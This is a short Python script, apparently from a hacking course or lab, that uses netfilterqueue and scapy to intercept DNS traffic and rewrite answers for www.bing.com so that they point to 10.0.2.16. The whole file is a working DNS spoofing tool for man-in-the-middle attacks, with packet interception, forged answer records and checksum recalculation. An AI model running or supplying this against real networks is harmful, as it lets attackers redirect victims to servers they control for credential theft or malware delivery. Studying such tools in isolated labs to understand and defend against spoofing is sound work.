#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import time
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    try:
        if scapy_packet[scapy.DNS]:
            qname=scapy_packet[scapy.DNSRR].qname
            print(qname)
            if "www.bing.com" in qname:
                print("(+) Spoofing Target")
                answer=scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
                scapy_packet[scapy.DNS].an=answer
                scapy_packet[scapy.DNS].ancount=1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len

                packet.set_payload(str(scapy_packet))
    except:
        time.sleep(0.25)
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(1, process_packet)
queue.run()